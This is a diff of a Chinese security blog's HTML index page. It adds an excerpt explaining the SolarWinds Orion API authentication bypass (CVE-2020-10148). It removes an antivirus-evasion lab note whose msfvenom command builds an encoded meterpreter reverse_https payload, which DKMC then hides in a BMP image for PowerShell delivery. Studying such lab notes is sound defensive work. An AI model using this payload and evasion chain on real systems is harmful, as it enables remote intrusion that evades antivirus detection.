@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1610630145093.css">
+<link rel="stylesheet" href="/css/style.css?v=1610630742470.css">
 
     <!--[if lt IE 9]>
     
@@ -119,6 +119,56 @@
             
         </strong>
     </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+        <a class="cat-link" href="/categories/POC-EXP/">POC&EXP</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2021/01/14/CVE-2020-10148-Solar-Winds-OrionAPI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    		CVE-2020-10148_Solar_Winds_OrionAPI_远程代码执行漏洞
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        SOC 将离 发表于
+        <time datetime="2021-01-14T13:23:12.000Z">2021-01-14</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/POC/" title="POC">POC</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                SolarWinds Orion API 嵌入在 Orion Core 中，被用于与所有 SolarWinds Orion Platform 产品进行接口。通过在URI请求的Request.PathInfo 部分中包含特定参数，可以绕过 API 身份验证，这可能允许攻击者执行未经身份验证的 API 命令。如果攻击者将WebResource.adx，scriptResource.adx，i18n.ashx 或 Skipi18n 的 PathInfo 参数附加到对 SolarWinds Orion 服务器的请求，SolarWinds 可能会设置 SkipAuthorization 标志，该标志可能允许处理API请求无需身份验证
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2021/01/14/CVE-2020-10148-Solar-Winds-OrionAPI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2021/01/14/CVE-2020-10148-Solar-Winds-OrionAPI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2020-10148_Solar_Winds_OrionAPI_远程代码执行漏洞">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/4.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
     
         <!-- 文章列表 item -->
 <article class="post">
@@ -665,70 +715,10 @@
 </article>
 
     
-        <!-- 文章列表 item -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-            <a href="javascript: void(0);" class="cat">未分类</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
-    	<a href="https://givemefivw.github.io/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/">
-    		免杀实验笔记之DKMC
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Jelon 发表于
-        <time datetime="2020-12-23T06:50:51.000Z">2020-12-23</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-    
-        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
-    
-
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h2 id="工具的流程"><a href="#工具的流程" class="headerlink" title="工具的流程"></a>工具的流程</h2><h4 id="1、先用msf生成raw文件"><a href="#1、先用msf生成raw文件" class="headerlink" title="1、先用msf生成raw文件"></a>1、先用msf生成raw文件</h4><h4 id="2、利用sc选项将raw文件转换为shellcode"><a href="#2、利用sc选项将raw文件转换为shellcode" class="headerlink" title="2、利用sc选项将raw文件转换为shellcode"></a>2、利用sc选项将raw文件转换为shellcode</h4><h4 id="3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像"><a href="#3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像" class="headerlink" title="3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像"></a>3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像</h4><h4 id="4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload"><a href="#4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload" class="headerlink" title="4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload"></a>4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload</h4><h4 id="5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件"><a href="#5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件" class="headerlink" title="5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件"></a>5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件</h4><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h4 id="1、生成raw文件"><a href="#1、生成raw文件" class="headerlink" title="1、生成raw文件"></a>1、生成raw文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_https LHOST&#x3D;192.168.70.133 LPORT&#x3D;2233 -e x86&#x2F;shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 -f raw -o &#x2F;root&#x2F;anti-payload&#x2F;dkmc_test.raw</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/1.png"></p>
-<h4 id="2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode"><a href="#2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode" class="headerlink" title="2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode"></a>2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode</h4><p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/2.png"></p>
-<h4 id="3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像"><a href="#3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像" class="headerlink" title="3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像"></a>3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像</h4><p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/3.png"></p>
-<p>可以看到成功生成了bmp文件到output文件夹</p>
-<h4 id="4、退回主菜单，选择ps选项，设置url地址，就是web分发图像文件的地址，再执行run生成powershell脚本"><a href="#4、退回主菜单，选择ps选项，设置url地址，就是web分发图像文件的地址，再执行run生成powershell脚本" class="headerlink" title="4、退回主菜单，选择ps选项，设置url地址，就是web分发图像文件的地址，再执行run生成powershell脚本"></a>4、退回主菜单，选择ps选项，设置url地址，就是web分发图像文件的地址，再执行run生成powershell脚本</h4><p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/4.png"></p>
-<h4 id="5、复制下powershell脚本，退回主菜单，选择web选项，默认端口80，执行run"><a href="#5、复制下powershell脚本，退回主菜单，选择web选项，默认端口80，执行run" class="headerlink" title="5、复制下powershell脚本，退回主菜单，选择web选项，默认端口80，执行run"></a>5、复制下powershell脚本，退回主菜单，选择web选项，默认端口80，执行run</h4><p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/5.png"></p>
-<p>把刚才复制的ps脚本设置为ps1文件，火绒会查杀到<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/6.png"></p>
-<h3 id="查杀率"><a href="#查杀率" class="headerlink" title="查杀率"></a>查杀率</h3><p>ps脚本的查杀率(12/60)<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/7.png"><br>bmp图像的查杀率(2/36)<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/8.png"></p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>DKMC主要是把shellcode注入到bmp图像中，然后使用powershell执行其中的shellcode，由于很多杀软都会监测powershell的行为，所以实际中不容易利用。</p>
-
-            
-            <p class="more">
-                <a href="https://givemefivw.github.io/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img="">
-            <a href="https://givemefivw.github.io/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/" title="免杀实验笔记之DKMC">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/3.jpg" alt="默认配图" >
-                
-            </a>
-        </div>
-    </div>
-</article>
-
-    
 
     
     <nav class="page-navigator">
-        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">下页</a>
+        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><a class="extend next" rel="next" href="/archives/page/2/">下页</a>
     </nav>
     
 
@@ -771,7 +761,7 @@
     
     <li>
         <a href="/categories/POC-EXP/">POC&amp;EXP</a>
-        <span class="badge">(2)</span>
+        <span class="badge">(3)</span>
     </li>
     
 </ul>
@@ -785,7 +775,7 @@
   
     <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (4)</a>
   
-    <a class="tag-item" href="/tags/POC/" title="POC">POC (8)</a>
+    <a class="tag-item" href="/tags/POC/" title="POC">POC (9)</a>
   
     <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (5)</a>
   
@@ -833,7 +823,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1610630145095.js"></script>
+<script src="/js/main.js?v=1610630742471.js"></script>
 
 
 </body>
